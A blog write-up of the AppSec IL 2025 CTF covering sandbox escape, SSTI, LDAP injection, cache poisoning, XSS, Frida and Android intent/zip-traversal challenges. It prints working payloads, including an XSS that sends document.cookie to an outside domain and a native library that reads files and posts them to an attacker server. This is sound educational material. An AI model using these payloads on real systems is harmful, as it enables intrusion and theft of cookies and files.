---
layout: post
title:  "AppSec IL 2025 CTF - Writeup"
subtitle: "A writeup on all challenges I solved in the 2025 OWASP CTF"
date:   2025-06-04 10:05:34 +0300
tags: [CTF, appsecil2025, write-up, hacking]
readtime: true
cover-img: ["/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-cover.png"]
thumbnail-img: "/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-share.png"
share-img: "/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-share.png"
---
 
This year's AppSec IL 2025 had a CTF accompanying it during the 3 days before the event.

I participated alone (hence why my team was "Loner"), and ended up placing 4th! Much better results than I expected.

You might notice that in the writeup I have 12 solved challenges whereas in the event I have 11 - that's because I solved the last one just about when the event ended and it didn't count :( All because of a silly mistake in the C++ code. I blame Claude.

Also on that note - this time around I heavily used ChatGPT, Claude desktop with some useful MCP servers (mostly to interact with my filesystem, run commands and WSL) and Cursor when source code was available. 

These AI tools didn't really manage to solve challenges on their own (maybe just the one which was really easy), but they were instead incredible at doing the following 3 things:

1. Making writing code *extremely* fast. That really compounded over time and made up for the fact I played alone. This was especially helpful since many, *many* challenges become so much easier if you run a local version of them, so setting up the requirements, adding some logging prints, and running the server became infinitely easier when I could just tell Cursor to do that on YOLO mode while I went to do another challenge meanwhile. It also greatly helped with languages I'm less familiar with.
2. Helping me come up with new ideas on how to tackle a problem when I got stuck. This was by far the most impactful on the harder challenges. Something about writing a good prompt on where you're at and listening to ideas just unlocks challenges for me.
3. Assisting in connecting the primitives/dots I already had figured out, and chaining them into something that could lead to a successful exploit. Sometimes you need someone to point out the obvious direction for you.

Of the challenges I didn't complete (just 3), I have very good direction for Magic Dashboard (a PHP deserialization that you need to use to somehow override a local variable, but my PHP knowledge isn't there yet) and Public Enemy (basically algorithm confusion in JWT creation).

As for the 3rd challenge - Safe-SeqNumber-Guard. I absolutely have no idea. I literally didn't manage to do a single thing against the AI here. No clue how this challenge is easy and what I had missed.

Anyway, let's go for the challenges writeup!

## AI - Sandcastle (hard, pwn)

Here you get a link `https://sandcastle.appsecil.ctf.today/mcp`, which very much leads you to think about MCP - the new cool standard on the block.

Luckily, I played a lot with MCP the past few months, so I rushed to [MCP Inspector](https://github.com/modelcontextprotocol/inspector) which just by running `npx @modelcontextprotocol/inspector` you can start up a local instance and connect it to whatever MCP server you want.

Connecting (with Streamable HTTP) to the server, it exposes a `listFiles` resource, which gives us the files in the MCP server directory

```json
{
  "contents": [
    {
      "uri": "listfiles://app",
      "text": "[\"code/executor.js\",\"code/validator.js\",\"code/workers/codeExecutorWorker.js\",\"package-lock.json\",\"package.json\",\"server.js\"]"
    }
  ]
}
```

And two tools - `getFile` that...gets a file, and `execute` that runs JavaScript code in the sandbox.

Running `getFile` on all the above and we have the source code of the MCP server. It's pretty long to implement all the details, but the interesting bit is the implementation of `execute`. Our clear goal is to escape the sandbox, run code on the host of the MCP server and extract the flag (which normally sits at `/flag`).

The `execute` code is composed of a few steps. First, it verifies the given code doesn't contain a bunch of forbidden words (it uses regex to search for a whole word on each of them). Then, it creates a new JavaScript VM based on the `isolated-vm` npm package, runs a quick code that freezes a lot of built-in objects, wraps your code around `use strict` and runs it. If it finishes successfully, it spawns a worker that runs it and returns the output.

So we have a JS sandbox escape here. Not too versed with this (only escaped Python sandboxes in the past), but how different can it be?

Well, it wasn't too different, except it was really difficult to debug what works and what doesn't, because if you try to return or print an object it fails since it complains about not being able to copy them, or them returning as undefined. 

But as long as you don't try to get the objects back to you and just one-shot the entire script, it simply works.

The initial success was to find how to find the `this` object and that it has the `process` child-object which contains basically all the imports that the process server has, including `fs` which simply lets you read files.

The way I managed to debug the way to this is by running the server locally and adding logging everywhere to understand what's the current object I managed to get to. 

In the end, this is the script that just works (and bypasses all checks):

```js
(() => {
    const obj = {};
    const FunctionConstructor = obj.constructor.constructor;
    const result = FunctionConstructor('return this')();
    const targetStr = ['p','r','o','c','e','s','s'].join('');
    const proc = Reflect.get(result, targetStr);
    
    try {
        const fStr = ['f','s'].join('');
        const fileSystem = proc.binding(fStr);
        
        const content = fileSystem.internalModuleReadJSON('/flag');
        return content;
    } catch (e) {
        return 'err: ' + e.message;
    }
})()
```

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-inspector.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>Using the MCP inspector</i></figcaption>
</figure>

Flag: `AppSec-IL{D3bu991n9_15_7h3_w@y}`

---

## API - NextGen (easy, web)

We just have a website that lets you create new users and sign into them. It generates a JWT for them of the following format:

```json
{
  "id": 6,
  "username": "aaa1",
  "guid": "b244506c-d009-4ca4-a16c-3e107b6eae64",
  "role": "user",
  "otp": "$6vy3O4d1rNz",
  "iat": 1749073451,
  "exp": 1749159851,
  "iss": "next-gen-portal"
}
```

Looks like the front-end was built with React and Webpack, so we can go through the JavaScript files it generates and see some interesting things.

Immediately looking in `admin`, you can see an `api/promote` endpoint that takes the admin's OTP token and the user GUID and promotes it to admin.

There's probably an issue here where you can guess or create the admin's OTP, or bypass the check on the OTP, but that wasn't needed as if you look at the `portal` webpack that is supposed to display the flag if you're an admin, it is simply there in the JavaScript...

Flag: `AppSec-IL{n3xt_g3n_m1ddl3w4r3_byp455_m45t3r}`

---

## Web - L33tChess (easy)

A website presenting a chess game you can play against yourself. We also get to see the source code.

It's a simple Flask server that uses `fen` notation with the `chess` library for Python to calculate allowed moves. I tried a bit to mess with this calculation to reach incorrect boards but that didn't work.

Then you can see that instead of using normal templates the code uses string concatenation to create a valid Jinja template. It inserts whatever's in the `msg` key's value within the `session` object.

This is set within the code that parses your move, however funnily enough if your move is invalid, your string gets reflected directly in the `msg` key's value to be a part of the error.

The flag is hidden in `config.SECRET_KEY` and you can make Jinja fill it out by using the special `{{code}}` notation it supports. 

So simply make a POST request to `/move` with some invalid move containing the code `{"move":"{{config.SECRET_KEY}}"}` and you'll see it reflected back to you.

Flag: `AppSec-IL{Ch3SSTI_1s_a_wInnIg_m0v3}`

---

## Web - X-Men (easy)

This challenge is a simple website that lets you search in a database. We don't get to see the source code but the search button says: "Search XML Database".

So naturally you think about XXE injection. However trying XXE payloads just doesn't really work. However falling back to simple SQLi (`' or 1=1 or '`) just works and returns hidden data in the database containing the flag.

Flag: `AppSec-IL{!XPaTh_Inj3ct10n@_F0rC3}`

---

## Cloud - Can't stop me now (easy)

Here we simply get a URL of an AWS SQS (simple queue service) queue.

Using AWS CLI, you can try to call the `receive-message` API. However the CLI creates a token for you/wants you to have a profile, and for some reason this just fails claiming you're unauthenticated, unsure.

However calling the `ReceiveMessage` API directly, unauthenticated simply works, and you read the next message in the queue which is the flag.

`curl -X POST "https://sqs.il-central-1.amazonaws.com/447694922079/production-queue?Action=ReceiveMessage&Version=2012-11-05"`

Flag: `AppSec-IL{mama_look_at_me_i_can_read}`

----

## IOT - The ART of IOT (easy, forensics)

Here you get a file with a weird extension: `.atkdl`. Running `file` on it says it's a zip. Unzipping and we get 16 directories with increasing numbers and a few files.

The `set.ini` file sheds some light:

```ini
[DL16 Plus]
isFirst=false
collectType=1
...
favoritesList=["SPI",null,"UART"]
...
```

Okay this is definitely something that could be a snapshot of a serial port communication. The words `SPI` and `UART` very much hint at that. 

There isn't any data in the 16 directories (a normal assumption is that those are 16 channels), except for directory 1 which contains two 1mb files filled mostly with 0s or 1s.

Not trying to bang your head parsing it too much, the problem with these channels is that this is probably some logic analyzer sniffing a serial connection. You can assume a lot of things about the connection and try to parse it, but there are just so many different serial standards, as well as logic analyzers each probably saving the analysis under a different convention, your best bet is to simply find the software that knows how to parse it.

Luckily, Googling `DL16 Plus` you quickly find that this tool belongs to Alientek and that they provide the tool (ATK-LogicViewer) for free which knows how to load `.atkdl` files. 

Once you have it loaded, you can see the actual content in the middle. Judging by the name of the challenge, this is UART and the tool supports parsing it as UART natively and displaying the characters as ASCII, so this simply shows you the flag.

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-atklogic.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>The Alientek DL16 Logic Analyzer</i></figcaption>
</figure>

Flag: `AppSec-IL{fr0m_w1r3_to_flag}`

----

## Web - OUtbreak (easy)

We have a link to a website and get its source code.

We can see from the source code the users are managed through a directory and authenticated/searched via LDAP. We just need to successfully log in to get the flag.

The search functionality that authenticates users is pretty simple:

```py
search_filter = f"(&(cn={username})(userPassword={password}))"
        connection.search(
            search_base=BASE_DN,
            search_filter=search_filter,
            search_scope=ldap3.SUBTREE,
            attributes=['cn']
        )
        result = connection.entries
        print(result)
        if result:
            return result[0].cn.value[1]
```

So we have a very simple LDAP search injection. We only need an existing username (which we have from the dockerfile - `DaGoat`) and we can try a wildcard password: `*`. But this gets blocked by the server.

So instead we can simply send this password `*)(cn=*` which works because the `cn` will also match `DaGoat` and the check for the wildcard is exact and not contains.

Flag: `AppSec-IL{inj3cti0n_s1mP1y_w0Rk5}`

---

## Web - Revenge of the Directory (medium)

This is a level-up version of `OUtbreak` above. We have a link to a different website and also have its source code.

This time the username is again `DaGoat` and there's actually no check on the password.

However, now the flag is not simply reflected after login, but instead is hidden in the `description` attribute of the user in the directory under base32.

So what you can do is use whether you login successfully or not as an indicator and add the description attribute in the LDAP search query. Using a wildcard, you can iterate over a prefix of the flag and know if it's correct if you managed to log in. This way you can reveal the description letter-by-letter.

Here's a short script that reveals the next letter:
```py
import requests

url = "https://revenge-of-the-directory.appsecil.ctf.today/login"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567}"
known_flag = "I"

def test_character(char):
    username = f"DaGoat)(description={known_flag}{char}*"
    password = "*"
    
    data = {
        'username': username,
        'password': password
    }
    
    try:
        response = requests.post(url, data=data)
        return "Welcome," in response.text
    except Exception as e:
        print(f"Error testing '{char}': {e}")
        return False

print(f"Testing characters after: {known_flag}")
print("Charset:", charset)

for char in charset:
    print(f"Testing: {char}", end=" ... ")
    if test_character(char):
        print("SUCCESS!")
        print(f"Next character is: {char}")
        break
    else:
        print("failed")
else:
    print("No character found!")
```

Eventually you get the entire string and just base32-decode it for the flag.

Flag: `AppSec-IL{5cr2pt1iNg_t0_exflitr4te_1S_3vil}`

---

## Web - Catch me (medium)

Here we have a link to a website and have its source code. We can see the server is served with nginx, and has a few simple routes.

The first one is login which is the default if you're not authenticated. We can see there are two users: `guest` and `admin`. We have the guest's password but not the admin's.

After logging in as guest you get your own subdomain. In the dashboard you can generate new tokens and access generated tokens by their id (which is incremental). There's also a report button which sends a POST request to `https://{your_sub_domain}.catch-me.appsecil.ctf.today/api/report` with a URL in the data.

Looking at the implementation of the report functionality, the given URL is parsed, a session is created with a persistent cookie jar, it is used to login as admin and then makes a request to the given URL. 

So essentially, you can make admin-authenticated requests by POSTing to `https://{your_sub_domain}.catch-me.appsecil.ctf.today/api/report` with any URL you want, but that falls under your subdomain.

I tried a few techniques to try and force the admin to make a request to somewhere outside of this server, or to leak its cookies somehow. 

But then I noticed that the handler `getTokenById` which retrieves a generated token, if the request is made using an admin, it simply returns the flag.

Looking back at the nginx configuration, we can see it is configured to save cache, so this is a classic cache poisoning - we make the admin request some token, the response is then cached and we can get it. That's why you get a personalized subdomain.

```
    location ~* \.(css|js|html)$ {
        proxy_cache my_cache;
        proxy_set_header Host $host;
        add_header X-Cache-Status $upstream_cache_status;
        proxy_ignore_headers Set-Cookie Cache-Control Expires;
        proxy_cache_valid any 10m;
        proxy_cache_key "$scheme://$host$request_uri";

        proxy_pass http://${CHALLENGE_BACKEND}:3000;
    }
```

So the nginx is configured to save cache for css/js/html files. Luckily, the router doesn't care and routes anything after `/api/token/` to the `getTokenById` handler (since it is configured to be `'/api/token/:tokenId'`)

So, if we can simply make a POST directing the admin to request `https://<subdomain>.catch-me.appsecil.ctf.today/api/token/0.html` the server will cache the response. So now if we access this from any authenticated instance (like with our guest) we can grab the flag.

Flag: `AppSec-IL{C4aching_1s_4w3s0m3}`

---

## Mobile - CTRL Alt Frida (medium, forensics, dev)

Here we get a link to a website that seems to allow us to upload Frida scripts and run them on a remote Android machine, as well as an app.

Probably we'll have to construct a Frida script that helps us extract the flag.

The APK doesn't contain much. Under `appsecil.wakeup` there's a single `MainActivity`. It is obviously obfuscated and there's a part that looks very interesting:

```java
if (c0266b.f703a.f700a.getString("WakeUp", null) == null) {
    char[] cArr = new char[38];
    // fill-array-data instruction
    cArr[0] = 'A';
    cArr[1] = 'p';
    cArr[2] = 'p';
    cArr[3] = 'S';
    cArr[4] = 'e';
    cArr[5] = 'c';
    cArr[6] = '-';
    cArr[7] = 'I';
    cArr[8] = 'L';
    cArr[9] = '{';
    cArr[10] = 'T';
    cArr[11] = 'h';
    cArr[12] = 'i';
    cArr[13] = 's';
    cArr[14] = '_';
    cArr[15] = 'i';
    cArr[16] = 's';
    cArr[17] = '_';
    cArr[18] = 'n';
    cArr[19] = 'o';
    cArr[20] = 't';
    cArr[21] = '_';
    cArr[22] = 'a';
    cArr[23] = '_';
    cArr[24] = 'f';
    cArr[25] = 'l';
    cArr[26] = 'a';
    cArr[27] = 'g';
    cArr[28] = '}';
    c0266b.f703a.edit().putString("WakeUp", new String(cArr)).apply();
    Arrays.fill(cArr, 0, 38, (char) 0);
}
```

So the flag is being loaded into memory, then saved as the value into whatever `c0266b.f703a` is with the key `WakeUp`.

Without trying to dig too much into it, this way of saving key value pairs at the beginning of the activity code looks like writing into the app's `SharedPreferences`.

Running this app in a local emulator, I wrote some simple Frida scripts that hook on several `SharedPreferences` objects, but no hits there.

After some debugging (which just means dumping all shared preferences) we can see there's one pair that is encrypted, and realize that the flag is probably saved into `EncryptedSharedPreferences` instead.

So we write a Frida script that hooks `androidx.security.crypto.EncryptedSharedPreferences` that simply reads the `WakeUp` key:

```javascript
Java.perform(function() {
    console.log("[+] Forcing read from EncryptedSharedPreferences...");
    
    try {
        Java.choose("androidx.security.crypto.EncryptedSharedPreferences", {
            onMatch: function(instance) {
                console.log("[+] Found EncryptedSharedPreferences instance, trying to read WakeUp...");
                try {
                    var wakeupValue = instance.getString("WakeUp", "not_found");
                    console.log("[+] *** READ WakeUp: " + wakeupValue + " ***");
                } catch(e) {
                    console.log("[-] Error in read: " + e);
                }
            },
            onComplete: function() {}
        });
        
    } catch(e) {
        console.log("[-] Error: " + e);
    }
});
```

And it works well, so let's upload it to the server and get the flag!

Flag: `AppSec-IL{r3d_vs_blU3_cho1c3_1s_y0urs}`

---

## Web - Big-In-Japan (easy)

A simple website, we do not get the source code here. It has a single form which you can put a URL into and then it says that it "clicked" the URL.

One thing that is immediate from this short script in the middle of the HTML:

```js
const filteredURLFromBackend = "";
const urlFromFrontend = new URLSearchParams(location.search).get("url");
if (urlFromFrontend && filteredURLFromBackend) {
    setTimeout(function () {
        location.href = filteredURLFromBackend;
    }, 1000);
}

```

The same endpoint expects a `url` parameter. If it exists, then it is being reflected into this script that simply redirects the user to the given url after server-side filtering:

```
            const filteredURLFromBackend = "<filtered_url>";
            const urlFromFrontend = new URLSearchParams(location.search).get("url");
            if (urlFromFrontend && filteredURLFromBackend) {
                setTimeout(function () {
                    location.href = filteredURLFromBackend;
                }, 1000);
            }
```

After some quick testing, the server side seems to filter all quotes (`"`, `'`, and `` ` ``) so we can't escape the string to simply run arbitrary JavaScript.

However we can input any URL we want and "someone" will "click" on it.

So we need to find a way to run JavaScript without breaking out of the string. 

We can use the `javascript:` scheme for this, but the server seems to also block it explicitly.

However URL schemes ignore backslash which isn't encoded by the website, so we can pass `java\script` to it and it will run arbitrary JavaScript.

Now the problem is only how to write a script that redirects the admin to our server without using quotes. This is easy! Use `fromCharCode` :) - just encode your server url so that the other user will be redirected to it. What is our flag though? Probably document.cookie as this is the target for every such XSS.

So if your domain is `my.domain.com`, the url parameter should be: `java\script:location=String.fromCharCode(104,116,116,112,115,58,47,47,109,121,46,100,111,109,97,105,110,46,99,111,109,63,99,61)%2Bdocument.cookie`

And the final URL to be submitted for a click (the parameter needs to be URL encoded): `https://big-in-japan.appsecil.ctf.today/?url=java%5Cscript%3Alocation%3DString.fromCharCode(104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C109%2C121%2C46%2C100%2C111%2C109%2C97%2C105%2C110%2C46%2C99%2C111%2C109%2C63%2C99%2C61)%252Bdocument.cookie`

Flag: `AppSec-IL{omedetto}`

---

## Mobile - Image Gallery (hard, pwn)

We get a link to a website and an Android app.

The website simply allows you to present a URL and a remote Android machine opens it and reports after it was done.

Opening the app in jadx, we can see it has 3 activities:

`MainActivity` (exported) - 
1. Prepares resources by copying an asset image (the flag.png) to the `files/img/` directory, and copying the relevant shared object library (according to the ABI) to the `files/lib/` directory.
2. Checks if an intent was received with `appsecil://localhost` scheme and host and a `url` parameter. If so, it calls `Intent.parseUri` on the URL in the parameter.
3. Otherwise, displays a simple button which starts the ImageGalleryActivity on click.

`ImageGalleryActivity` (not exported) -
Iterates over all images in the `files/img` directory. For each file, calls the native function `isValid` from the shared library, and if it passes, decodes the file as a bitmap and displays it in an ImageView container.

`ZipImageActivity` (not exported) -
Extracts a string extra from the received intent named `url`. On success, takes the URL and downloads a file from it, treats it as a zip file and extracts its contents into the `files/img/` directory.

We can immediately see two issues here:
1. Even though the `ZipImageActivity` is not exported, by having the main exported activity call `Intent.parseUri` on a URL that we supply makes it so we can simply send an intent URL and start the `ZipImageActivity` and force it to download a zip from a location we control.
2. The code at the `Unzip` class doesn't verify there's no directory traversal in the zip file. This issue is blocked at recent SDK versions (>33), but we can assume the remote phone is an older version.

The fact that the main activity resets the images and the shared objects every time it is created strongly hints that we need to use the directory traversal to override files, namely the shared objects, to leak the real `flag.png`

The attack turns out to be pretty blind and convoluted to do without a local setup, I ran a local Genymotion emulator (since my test Android has too high an SDK version) to test this on. Turns out I almost got it blind on first attempt (within the CTF time!), but the C++ code had a small bug in it :(

Anyway, what we need is:

1. Use NDK to compile 4 versions (PIC for all possible ABIs - example for x86: `$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/i686-linux-android21-clang++ -shared -fPIC -O2 -std=c++17 imgcheck.cpp  -o libimgcheck_x86.so`) of a simple C++ file that exports a single `isValid` function:

```cpp
JNIEXPORT jboolean JNICALL
Java_com_appsecil_imagegallery_ImgCheck_isValid(JNIEnv *env, jclass clazz, jstring jpath) {
    const char *path = env->GetStringUTFChars(jpath, NULL);
    
    FILE *f = fopen(path, "rb");
    if (f) {
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        unsigned char *buffer = (unsigned char*)malloc(size);
        size_t bytesRead = fread(buffer, 1, size, f);
        fclose(f);
        
        char *encoded_data = base64_encode(buffer, bytesRead);
        if (encoded_data != NULL) {
            // Create socket
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                struct hostent *host = gethostbyname("my.domain.com");
                if (host) {
                    struct sockaddr_in server;
                    memset(&server, 0, sizeof(server));
                    server.sin_family = AF_INET;
                    server.sin_port = htons(80);
                    memcpy(&server.sin_addr.s_addr, host->h_addr, host->h_length);
                    
                    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
                        const char *filename = strrchr(path, '/');
                        filename = filename ? filename + 1 : path;
                        
                        size_t encoded_length = strlen(encoded_data);
                        char headers[2048];
                        int headerLen = snprintf(headers, sizeof(headers),
                            "POST /%s HTTP/1.1\r\n"
                            "Host: my.domain.com\r\n"
                            "Content-Type: text/plain\r\n"
                            "Content-Length: %zu\r\n"
                            "Connection: close\r\n\r\n",
                            filename, encoded_length);
                        
                        if (headerLen > 0 && headerLen < sizeof(headers)) {
                            send(sock, headers, headerLen, 0);
                            send(sock, encoded_data, encoded_length, 0);
                        }
                    }
                    close(sock);
                }
            }
            free(encoded_data);
        }
        
        free(buffer);
    }
    
    env->ReleaseStringUTFChars(jpath, path);
    return JNI_TRUE;
}
``` 
2. Put the compiled shared libraries into a zip file with traversal one directory up (so they land inside the `files/lib/` directory):
```py
import zipfile

with zipfile.ZipFile('malicious.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    architectures = [
        ('x86', 'libimgcheck_x86.so'),
        ('x86_64', 'libimgcheck_x86_64.so'),
        ('armeabi-v7a', 'libimgcheck_arm.so'),
        ('arm64-v8a', 'libimgcheck_arm64.so')
    ]
    
    for arch, filename in architectures:
        with open(filename, 'rb') as f:
            zip_path = f'../lib/{arch}/libimgcheck.so'
            zf.writestr(zip_path, f.read())
```
3. Serve the `malicious.zip` on a publicly available URL. I have my own server so I just ran a simple script to do so:
```py
# ...
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def handle_request(path):
    return send_file(
        ZIP_FILE_PATH,
        mimetype='application/zip',
        as_attachment=True,
        download_name='data.zip'
    )
# ...
```
4. Send the following intent to the remote machine: `appsecil://localhost?url=intent://host%23Intent%3Bcomponent%3Dcom.appsecil.imagegallery/.ZipGalleryActivity%3BS.url%3Dhttps://dev.taltechtreks.com/payload.zip%3Bend`. Removing the URL decode on the `url` parameter, it is actually: `intent://host#Intent;component=com.appsecil.imagegallery/.ZipGalleryActivity;S.url=https://my.domain.com/payload.zip;end`. 

So what will actually happen on the remote machine:

1. `MainActivity` will be triggered with the appropriate schema and domain, take the url and parse it as intent, which, after the fragment, basically tells it to start `ZipGalleryActivity`. It then takes the `S.url` extra string, which downloads the zip from my domain.
2. The zip is unpacked, copying all compiled shared libraries into the `files/lib/` directory
3. `ImageGalleryActivity` will be invoked, which loads the shared library and calls `isValid` on all files. One of which will be `flag.png` which will be read, and sent to my domain base64 encoded.
4. We get the file leaked! `iVBORw0KGgoAAAANSUhEUgAAATAAAAAzCAIAAACfesO+AAACOklEQVR4nO3XwXLjIAwAUGdn//+XvYd0Mi4SgsQ4zWzfO7UJCAECO9sGAAAAAAAAAAAAAAAAAAAAAAAAwP/r9tMJvMm+79u23W7d+Q4bvFmRz/2r3rcLB1re6yKPBdm+p/SeJNeOcipKbyGu61gEKWIel+zY7OXRlwTZTi9g3WUy+NsO5JJNL0L94B2xcOi/Zzo3xyCWaVq46fGIt/7wOfCIf2/Q/DufeXGwe9GOY+37vu97M510FjFymnOaT292xZSbLmmcZhHiLF7oNcwnJp+uUm8fi+u1adMbt9jlZvSY4Xyer/lzPsQjoeaPR5lu2fLFOj7+nX5yNJ9eU7LxGNw/6U1nfqzhLCYjp/nEMx+nVkvjNMvSy3myV0y+l0Zch+KyTh3rJx2l3tN0L+pM0qk9SmiY8KRTB/I4jflsjhMrHrBN49t380merONnxVks2aeet81iMo3iuiyq5VjWw9F79bNKrw6HXZbsxalX1rv4QK/d76fitaFp3PuqHmIY8KJj2btEh16e6aopDN85i17No7J+dg2rZVj9af2sMnzCX/Sy+hXzTOdY3HFTZz6pm/WmXf9OiMHT94r0XhiW5vAXSDpcjJzm3Mun+CPNs5dMvIzSH07F6LHX8G4tGjddnlr8yXfFycqMH9Zt0gL7LPGN5dmffBd5Ko3rcv6Q1fiFFlZm03Htnq4805OX0IcbXpzNVycjr7Ikw4VW5XPRyp95P38tBwAAAAAAAAAAAAAAAAAAAAAA+GX+ATHqmjLXSHBIAAAAAElFTkSuQmCC` which translates to a nice image of the flag!

Flag: `AppSec-IL{Zip_DeepLink_Intents_Are_Slippery}`

---

# Final Scoreboard

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Appsecil2025-Writeup/Appsecil2025-Writeup-share.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>Final Scoreboard</i></figcaption>
</figure>